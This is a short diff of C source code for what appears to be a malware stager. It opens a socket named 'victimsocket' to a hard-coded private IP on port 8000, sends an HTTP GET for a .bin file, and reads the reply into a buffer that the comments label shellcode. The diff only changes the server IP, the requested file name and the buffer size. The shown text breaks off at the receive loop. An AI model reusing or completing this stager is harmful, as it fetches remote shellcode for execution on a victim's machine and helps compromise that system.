@@ -83,7 +83,7 @@ int main()
     struct sockaddr_in server_address;
 	memset(&server_address, 0, sizeof(server_address)); //initialize the address to zerods
     server_address.sin_family = AF_INET;
-    server_address.sin_addr = inet_addr("192.168.255.14");
+    server_address.sin_addr = inet_addr("192.168.255.17");
     server_address.sin_port = htons(8000);
 
 		int victimconnect = connect(victimsocket, (struct sockaddr*)&server_address, sizeof(struct sockaddr_in));
@@ -93,7 +93,7 @@ int main()
 		}
 
     //SEND DATA TO SERVER REQUESTING FOR SHELLCODE
-    char *message = "GET /shellURLdownloader.bin HTTP/1.1\r\nHost: 192.168.255.14\r\n\r\n";
+    char *message = "GET /downloader.bin HTTP/1.1\r\nHost: 192.168.255.17\r\n\r\n";
 	printf ("%s", message);
     int victimsend = send(victimsocket, message, strlen(message), 0);
 		if (victimsend == -1){
@@ -107,7 +107,7 @@ int main()
 	
 
     //RECIEVE DATA FROM SERVER I.E SHELLCODE
-    char data[86891];
+    char data[86870];
 	int recv_byte;
 	
 	do {
